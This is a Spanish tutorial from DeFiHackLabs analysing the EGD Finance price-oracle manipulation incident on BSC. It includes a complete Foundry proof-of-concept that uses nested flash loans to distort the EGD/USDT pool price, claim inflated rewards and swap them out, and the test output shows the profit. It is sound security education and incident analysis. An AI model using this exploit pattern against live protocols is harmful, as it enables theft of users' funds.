# Debugging/Análisis OnChain de Transacciones: 3. Escribe tu Propio PoC (Manipulación del Oráculo de Precios)

Autor: [▓▓▓▓▓▓](https://twitter.com/h0wsO1)

Traducción: [JP](https://x.com/CanonicalJP) 

Comunidad: [Discord](https://discord.gg/Fjyngakf3h)

Publicado en: XREX | [WTF Academy](https://github.com/AmazingAng/WTF-Solidity#%E9%93%BE%E4%B8%8A%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90)

En [01_Herramientas](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/01_tools/es), aprendimos cómo usar varias herramientas para analizar transacciones en contratos inteligentes.

En [02_Calentamiento](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/academy/onchain_debug/02_warmup/es/readme.md), analizamos una transacción en un exchange descentralizado usando Foundry.

Para esta publicación, analizaremos un incidente de hackeo utilizando una vulnerabilidad del oráculo. Te guiaremos paso a paso a través de las llamadas a funciones clave y luego reproduciremos el ataque juntos usando el framework Foundry.

## ¿Por qué es útil reproducir ataques?

En DeFiHackLabs pretendemos promover la seguridad en Web3. Esperamos que cuando ocurran ataques, más personas puedan analizar y contribuir a la seguridad general.

1. Como víctimas desafortunadas, mejoramos nuestra respuesta a incidentes y efectividad.
2. Como whitehats, mejoramos nuestra habilidad para escribir PoCs y obtener recompensas por bugs.
3. Ayudamos al equipo blue en ajustar modelos de aprendizaje automático. Por ejemplo, [Forta Network](https://forta.org/blog/how-fortas-predictive-ml-models-detect-attacks-before-exploitation/).
4. Aprenderás mucho más reproduciendo el ataque en comparación con leer post-mortems.
5. Mejoras tu "Kung Fu" general en Solidity.

### Algunos conocimientos necesarios antes de reproducir transacciones

1. Comprensión de los modos de ataque comunes. Los cuales hemos curado en [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs).
2. Comprensión de los mecanismos básicos de DeFi, incluyendo cómo los contratos inteligentes interactúan entre sí.

### Introducción al Oráculo DeFi

Actualmente, los valores de los contratos inteligentes como precios y configuración no pueden actualizarse por sí mismos. Para ejecutar su lógica de contrato, a veces se requieren datos externos durante la ejecución. Esto se hace típicamente con los siguientes métodos.

1. A través de cuentas de propiedad externa. Podemos calcular el precio basándonos en las reservas de estas cuentas.
2. Usar un oráculo, que es mantenido por alguien o incluso por ti mismo. Con datos externos actualizados periódicamente. Por ejemplo, precio, tasa de interés, cualquier cosa.

* Por ejemplo, en Uniswap V2 se proporciona el precio actual del activo, que se utiliza para determinar el valor relativo del activo que se está negociando y así ejecutar el intercambio.

  * Siguiendo la figura, el precio de ETH es el dato externo. El contrato inteligente lo obtiene de Uniswap V2.

    Conocemos la fórmula `x * y = k` en un AMM típico. `x` (el precio de ETH en este caso) = `k / y`.

    Así que echemos un vistazo al contrato del par de trading WETH/USDC de Uniswap V2. En esta dirección `0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc`.

![UniV2PairInfo](https://user-images.githubusercontent.com/26408530/211231355-0d1fb43e-280e-4328-b71e-9797be5ce7ec.png)

* En el momento de la publicación, vemos los siguientes valores de reserva:

  * WETH: `33,906.6145928`  USDC: `42,346,768.252804` 

  * Fórmula: Aplicando la fórmula `x * y = k` obtendremos el precio de cada ETH:

     `42,346,768.252804 / 33,906.6145928 = 1248.9235`
     
   (Los precios de mercado pueden diferir del precio calculado por unos centavos. En la mayoría de los casos, esto se refiere a una comisión de trading o una nueva transacción que afecta al pool. Esta varianza se puede eliminar con `skim()`[^1].)

  * Pseudocódigo en Solidity: Para que el contrato de préstamo obtenga el precio actual de ETH, el pseudocódigo puede ser el siguiente:

```solidity
uint256 UniV2_ETH_Reserve = WETH.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 UniV2_USDC_Reserve = USDC.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 ETH_Price = UniV2_USDC_Reserve / UniV2_ETH_Reserve;
```
   > #### Ten en cuenta que este método de obtener el precio es fácilmente manipulable. Por favor, no lo uses en el código de producción.

[^1]: Skim() :
Uniswap V2 es un exchange descentralizado (DEX) que utiliza un pool de liquidez para intercambiar activos. Tiene una función `skim()` como medida de seguridad para protegerse contra posibles problemas de implementaciones de tokens personalizados que puedan cambiar el balance del contrato del par. Sin embargo, `skim()` también puede usarse en conjunto con la manipulación de precios.
Por favor, consulta la figura para una explicación completa de Skim().
![截圖 2023-01-11 下午5 08 07](https://user-images.githubusercontent.com/107821372/211970534-67370756-d99e-4411-9a49-f8476a84bef1.png)
Fuente de la imagen / [Uniswap V2 Core whitepaper](https://uniswap.org/whitepaper.pdf)

* Para más información, puedes seguir los siguientes recursos
  * Mecanismos AMM de Uniswap V2: [Smart Contract Programmer](https://www.youtube.com/watch?v=Ar4Ik7Bov0U).
  * Manipulación de oráculo: [WTFSolidity](https://github.com/WTFAcademy/WTF-Solidity/blob/main/S15_OracleManipulation/readme.md).

### Modos de Ataque de Manipulación de Precios del Oráculo

Modos de ataque más comunes:

1. Alterar la dirección del oráculo
    * Causa raíz: falta de mecanismo de verificación
    * Por ejemplo: [Rikkei Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220415-rikkei-finance---access-control--price-oracle-manipulation)
2. A través de flash loans, un atacante puede drenar la liquidez, resultando en información de precios incorrecta en un oráculo.
    * Esto se ve más a menudo en atacantes llamando a estas funciones: GetPrice, Swap, StackingReward, Transfer (con comisión de quema), etc.
    * Causa raíz: Protocolos usando oráculos inseguros/comprometidos, o el oráculo no implementó características de precio promedio ponderado por tiempo.
    * Ejemplo: [One Ring Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220321-onering-finance---flashloan--price-oracle-manipulation)

    >  Consejo profesional-caso 2: Durante la revisión del código, asegúrate de que la función `balanceOf()` esté bien protegida.

---
## PoC paso a paso - Un ejemplo de EGD Finance

### Paso 1: Recopilación de información

* Al descubrir un ataque, Twitter suele ser el primer lugar dónde analyzar las consecuencias. Los principales analistas de DeFi publicarán continuamente sus nuevos hallazgos allí.

> Consejo profesional: ¡Únete al canal de alertas de seguridad de [DeFiHackLabs Discord](https://discord.gg/Fjyngakf3h) para recibir actualizaciones seleccionadas de los principales analistas de DeFi!

* Ante un incidente de ataque, es importante recopilar y organizar la información más reciente. ¡Aquí tienes una plantilla!
  1. ID de la transacción
  2. Dirección del atacante (EOA)
  3. Dirección del contrato de ataque
  4. Dirección vulnerable
  5. Pérdida total
  6. Enlaces de referencia
  7. Enlaces de post-mortem
  8. Fragmento vulnerable
  9. Historial de auditoría

> Consejo profesional: Usa la plantilla [Exploit-Template.sol](/script/Exploit-template.sol) de DeFiHackLabs.
---
### Paso 2: Debugging/Análisis de la transacción

Basado en la experiencia, 12 horas después del ataque, el 90% de la autopsia del ataque se habrá completado. Generalmente no es demasiado difícil analizar el ataque en este punto.

* Usaremos un caso real del [ataque de vulnerabilidad a EGD Finance](https://twitter.com/BlockSecTeam/status/1556483435388350464) como ejemplo, para ayudarte a entender:
  1. el riesgo en la manipulación del oráculo.
  2. cómo beneficiarse de la manipulación del oráculo.
  3. transacción de flash loan.
  4. cómo los atacantes reproducen con solo 1 transacción para lograr el ataque.

* Usemos [Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3) de Blocksec para analizar el incidente de EGD Finance.
<img width="1644" alt="Screenshot 2023-01-11 at 4 59 15 PM" src="https://user-images.githubusercontent.com/107821372/211762771-d2c54800-4595-4630-9392-30431094bfca.png">

* En Ethereum EVM, verás 3 tipos de llamadas para activar funciones remotas:
  1. Call: Llamada típica a función entre contratos, a menudo cambiará el almacenamiento del receptor.
  2. StaticCall: No cambiará el almacenamiento del receptor, se usa para obtener estado y variables.
  3. DelegateCall: `msg.sender` permanecerá igual, típicamente usado en llamadas de proxy. Por favor, consulta [WTF Solidity](https://github.com/WTFAcademy/WTF-Solidity/tree/main/23_Delegatecall) para más detalles.

> Ten en cuenta que las llamadas a funciones internas[^2] no son visibles en Ethereum EVM.
[^2]: Las llamadas a funciones internas son invisibles para la blockchain ya que no crean nuevas transacciones o bloques. De esta manera, no pueden ser leídas por otros contratos inteligentes ni aparecer en el historial de transacciones de la blockchain.
* Información adicional - Modo de ataque de flash loan de los atacantes
  1. Comprobar si el ataque será rentable. Primero, asegurarse de que se pueden obtener préstamos, luego asegurarse de que el objetivo tiene suficiente saldo.
     - Esto significa que verás algunas 'llamadas estáticas' al principio.
  2. Usar DEX o Protocolos de Préstamo para obtener un flash loan, buscar las siguientes llamadas a funciones clave
     - UniswapV2, Pancakeswap: `.swap()`
     - Balancer: `flashLoan()`
     - DODO: `.flashloan()`
     - AAVE: `.flashLoan()`
  3. Devoluciones de llamada del protocolo de flash loan al contrato del atacante, buscar las siguientes llamadas a funciones clave
        - UniswapV2: `.uniswapV2Call()`
        - Pancakeswap: `.Pancakeswap()`
        - Balancer: `.receiveFlashLoan()`
        - DODO: `.DXXFlashLoanCall()`
        - AAVE: `.executeOperation()`
   4. Ejecutar el ataque para beneficiarse de la debilidad del contrato.
   5. Devolver el flash loan

### Práctica: 

Identifica varias etapas del ataque de vulnerabilidad de EGD Finance en [Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3). Más específicamente 'flashloan', 'callback', 'debilidad' y 'beneficio'.

`Expandir Nivel: 3`
<img width="1898" alt="TryToDecodeFromYourEyes" src="https://user-images.githubusercontent.com/26408530/211231441-b5cd2cd8-a438-4344-b014-6b8e92ab2532.png">

>Consejo profesional: Si no puedes entender la lógica de las llamadas a funciones individuales, intenta seguir toda la pila de llamadas secuencialmente, toma notas y presta especial atención al rastro del dinero. Tendrás una comprensión mucho mejor después de hacer esto unas cuantas veces.
<details><summary>La Respuesta</summary>

<img width="1589" alt="Screenshot 2023-01-12 at 1 58 02 PM" src="https://user-images.githubusercontent.com/107821372/211996295-063f4c64-957a-4896-8736-c4dbbc082272.png">

</details>

### Paso 3: Reproducir código
Después del análisis de las llamadas a funciones de la transacción de ataque, intentemos ahora reproducir algo de código:

#### Paso A. Completar los fixtures.

<details><summary>Haz clic para mostrar el código</summary>
 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// Declaring a global variable must be of constant type.
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() { // can also be replaced with ‘function setUp() public {}
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command."
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //Note: The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
}
```
</details>
<br>

#### Paso B. Simular un atacante llamando a la función harvest
<details><summary>Haz clic para mostrar el código</summary>

```solidity
contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() {
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command.
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
 
    function testExploit() public { // To be executed by Foundry testcases, it must be named "test" at the start.
        //To observe the changes in the balance, print out the balance first, before attacking.
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        
        console.log("Attacker manipulating price oracle of EGD Finance...");
        exploit.harvest(); //A simulation of an EOA call attack
        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
}
```
</details>
<br>

#### Paso C. Completar parte del contrato de ataque
<details><summary>Haz clic para mostrar el código</summary>

```solidity
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;

    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //獲利了結
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        // Weakness exploit...

        // Exchange the stolen EGD Token for USDT
        console.log("Swap the profit...");
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //Attacker repays 2,000 USDT + 0.5% service fee
        require(suc, "Flashloan[1] payback failed");
    }
}
```
</details>
<br>

### Paso 4: Analizando la vulnerabilidad

Vemos aquí que el atacante llamó a la función `Pancakeswap.swap()` para aprovechar la vulnerabilidad, parece que hay una segunda llamada de flash loan en la pila de llamadas.
![Flashloan2](https://user-images.githubusercontent.com/26408530/211231489-4977bc1d-4ed0-45f8-b014-8de92942fe4f.png)

* Pancakeswap usa la interfaz `.pancakeCall()` para realizar una devolución de llamada en el contrato del atacante. Podrías estar preguntándote cómo el atacante está ejecutando diferentes códigos durante cada una de las dos devoluciones de llamada.

La clave está en el primer flash loan, el atacante usó `0x0000` en los datos de devolución de llamada.
![FlashloanCallbackData1](https://user-images.githubusercontent.com/26408530/211231501-7b8e508a-a6fe-4f28-9308-5406d0dec32f.png)

Sin embargo, durante el segundo flash loan, el atacante usó `0x00` en los datos de devolución de llamada.
![FlashloanCallbackData2](https://user-images.githubusercontent.com/26408530/211231506-e76cc110-3969-486d-b917-7ddec3d46ee5.png)

A través de este método, un contrato atacante puede determinar qué código ejecutar basándose en el parámetro `_data`. Que podría ser 0x0000 o 0x00.

* Continuemos analizando la lógica de la segunda devolución de llamada durante el segundo flash loan.

Durante la segunda devolución de llamada, el atacante solo llamó a `claimAllReward()` de EGD Finance:

![CallClaimReward](https://user-images.githubusercontent.com/26408530/211231522-a54ef929-63e3-4b9c-8f0c-e609c2055b2c.png)

Expandiendo más la pila de llamadas de `claimAllReward()`. Encontrarás que EGD Finance realizó una lectura en `0xa361-Cake-LP` para el balance de EGD Token y USDT, luego transfirió una gran cantidad de EGD Token al contrato del atacante.

![ClaimRewardDetail](https://user-images.githubusercontent.com/26408530/211231532-d9b0e7ce-ee65-48fb-a2eb-6fccbb799234.png)

<details><summary>¿Qué es el contrato '0xa361-Cake-LP'?</summary>

Usando Etherscan, podemos ver a qué par de trading corresponde `0xa361-Cake-LP`.

* Opción 1 (más rápida): Ver los dos tokens de reserva más grandes del contrato en [Etherscan](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d) 

![Etherscan-Top2](https://user-images.githubusercontent.com/26408530/211231654-613672c0-400d-4e53-891c-4c309d8ce84c.png)
* Opción 2 (precisa): [Leer Contrato](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#readContract) Verificar la dirección de token0 y token1.

<img width="404" alt="Etherscan-ReadContract" src="https://user-images.githubusercontent.com/26408530/211231545-43777f4e-6433-4dba-b2dc-ab54cd7aaeed.png">

Esto indica que `0xa361-Cake-LP` es el contrato del par de trading EGD/USDT.

</details>
<br>

* Analicemos la función `claimAllReward()` para ver dónde se encuentra la vulnerabilidad.
<img width="1518" alt="ClaimRewardCode" src="https://user-images.githubusercontent.com/26408530/211231553-770e01d9-d809-43e1-99df-8674b0b30c8c.png>

Vemos que la cantidad de Recompensa de Staking se basa en el factor `quota` de recompensa (que significa la cantidad de staking y la duración del staking) multiplicado por `getEGDPrice()`, el precio actual del token EGD.

**Esto significa que la Recompensa de Staking de EGD se basa en el precio del Token EGD. Se obtiene menos recompensa con un precio alto del Token EGD y viceversa.**

* Ahora veamos cómo la función `getEGDPrice()` obtiene el precio actual del Token EGD:

<img width="529" alt="getEGDPrice" src="https://user-images.githubusercontent.com/26408530/211231565-596b32d8-cbb9-4f59-a53e-77d837d2766c.png>

Vemos la ecuación familiar `x * y = k` como la que introdujimos anteriormente en la sección de introducción al oráculo DeFi, para obtener el precio actual. La dirección del `pair` de trading es `0xa361-Cake-LP`, que coincide con las dos STATICCALL de la vista de transacción.

![getEGDPrice_Static](https://user-images.githubusercontent.com/26408530/211231574-bb7a652d-3538-4ca1-859d-a30962014d44.png)

Entonces, ¿cómo está aprovechando el atacante este método inseguro de obtener los precios actuales?

El mecanismo subyacente es tal que, a partir del segundo flash loan, el atacante pidió prestada una gran cantidad de USDT, influyendo así en el precio del pool basado en la fórmula `x * y = k`. Antes de devolver el préstamo, el `getEGDPrice()` será incorrecto.

Diagrama de referencia:
![CleanShot 2023-01-12 at 17 01 46@2x](https://user-images.githubusercontent.com/107821372/212027306-3a7f9a8c-4995-472c-a8c7-39e5911b531d.png)
**Conclusión: El atacante usó un flash loan para alterar la liquidez del par de trading EGD/USDT, resultando en que `ClaimReward()` obtenga un precio incorrecto, permitiendo al atacante obtener una cantidad obscena de tokens EGD.**

Finalmente, el atacante intercambió el Token EGD usando Pancakeswap por USDT, obteniendo así beneficios del ataque.

---
### Paso 5: Reproducir
Ahora que hemos entendido completamente el ataque, vamos a reproducirlo:

Paso D. Escribir el código PoC para el ataque

<details><summary>Haz clic para mostrar el código</summary>

```solidity
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Gaining profit
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // Exchange the stolen EGD Token for USDT after the exploit is over.
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000;   // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+swapfee);
            require(suc, "Flashloan[2] payback failed");         
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

Paso E. Escribir el código PoC para el segundo flash loan usando la vulnerabilidad

<details><summary>Haz clic para mostrar el código</summary>

```solidity
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Gaining profit
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // Exchange the stolen EGD Token for USDT after the exploit is over.
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000;   // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+swapfee);
            require(suc, "Flashloan[2] payback failed");         
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

Paso F. Ejecutar el código con `forge test --contracts ./src/test/EGD-Finance.exp.sol -vvv`. Presta atención al cambio en los saldos.

[DeFiHackLabs - EGD-Finance.exp.sol](https://github.com/finn79426/DeFiHackLabs/blob/main/src/test/EGD-Finance.exp.sol)

```
Running 1 test for src/test/EGD-Finance.exp.sol:Attacker
[PASS] testExploit() (gas: 537204)
Logs:
  --------------------  Pre-work, stake 10 USDT to EGD Finance --------------------
  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Attacker Stake 10 USDT to EGD Finance
  -------------------------------- Start Exploit ----------------------------------
  [Start] Attacker USDT Balance: 0.000000000000000000
  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
  [INFO] Current earned reward (EGD token): 0.000341874999999972
  Attacker manipulating price oracle of EGD Finance...
  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
  Flashloan[1] received
  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
  Flashloan[2] received
  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
  Claim all EGD Token reward from EGD Finance contract
  [INFO] Get reward (EGD token): 5630136.300267721935770000
  Flashloan[2] payback success
  Swap the profit...
  Flashloan[1] payback success
  -------------------------------- End Exploit ----------------------------------
  [End] Attacker USDT Balance: 18062.915446991996902763

Test result: ok. 1 passed; 0 failed; finished in 1.66s
```
Nota: EGD-Finance.exp.sol de DeFiHackLabs incluye un paso preventivo que es el staking.

Esta explicación no incluye este paso, ¡siéntete libre de probarlo tú mismo! Tx de Stake del Atacante: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

#### La tercera parte concluirá aquí, si deseas aprender más, consulta los enlaces a continuación.

---
### Materiales de aprendizaje (en Inglés)

[Explorador de transacciones eth de samczsun y extensión de vscode](https://www.youtube.com/watch?v=HXgu239mPBc)

[Vulnerabilidades en DeFi por Daniel V.F.](https://www.youtube.com/watch?v=9fcOffCg2ig)

[Tenderly.co - Depuración de Transacciones](https://www.youtube.com/watch?v=90GN9Ut8LhU)

[Revirtiendo la EVM: Calldata en Bruto](https://degatchi.com/articles/reading-raw-evm-calldata)

[https://web3sec.xrex.io/](https://web3sec.xrex.io/)

---
### Apéndice

